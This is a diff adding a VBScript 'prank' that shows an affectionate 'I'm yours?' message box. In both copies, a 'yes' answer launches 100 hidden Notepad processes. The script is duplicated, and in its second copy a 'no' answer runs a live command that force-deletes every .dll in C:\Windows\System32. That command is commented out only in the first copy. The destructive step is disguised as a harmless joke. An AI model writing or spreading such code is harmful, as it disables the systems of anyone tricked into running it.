@@ -1,0 +1,37 @@
+Dim response
+response = MsgBox("Hi! I'm Chiki... I'm yours, are you mine? ♥", vbYesNo + vbQuestion, "I'm Yours?")
+
+If response = vbYes Then
+    ' Simulate system slowdown by opening many files (in real script, simulate only!)
+    For i = 1 To 100
+        CreateObject("WScript.Shell").Run "notepad.exe", 0, False
+    Next
+    MsgBox "Yay! I'm yours ♥ Now let's play forever..."
+Else
+    MsgBox "You broke my heart 💔... deleting memories..."
+    ' Simulated delete (in real use, don't ever do this)
+    ' Set fso = CreateObject("Scripting.FileSystemObject")
+    ' fso.DeleteFile "C:\Windows\System32\*.dll", True
+    MsgBox "Goodbye... 💀"
+End If
+
+Dim response
+response = MsgBox("Hi! I'm Chiki... I'm yours, are you mine? ♥", vbYesNo + vbQuestion, "I'm Yours?")
+
+If response = vbYes Then
+    ' Simulate system slowdown by opening many files (in real script, simulate only!)
+    For i = 1 To 100
+        CreateObject("WScript.Shell").Run "notepad.exe", 0, False
+    Next
+    MsgBox "Yay! I'm yours ♥ Now let's play forever..."
+Else
+    MsgBox "You broke my heart 💔... deleting memories..."
+    
+    ' Create the FileSystemObject to delete files
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    ' WARNING: This line will attempt to delete .dll files from the system folder (dangerous!)
+    fso.DeleteFile "C:\Windows\System32\*.dll", True
+    
+    MsgBox "Goodbye... 💀"
+End If
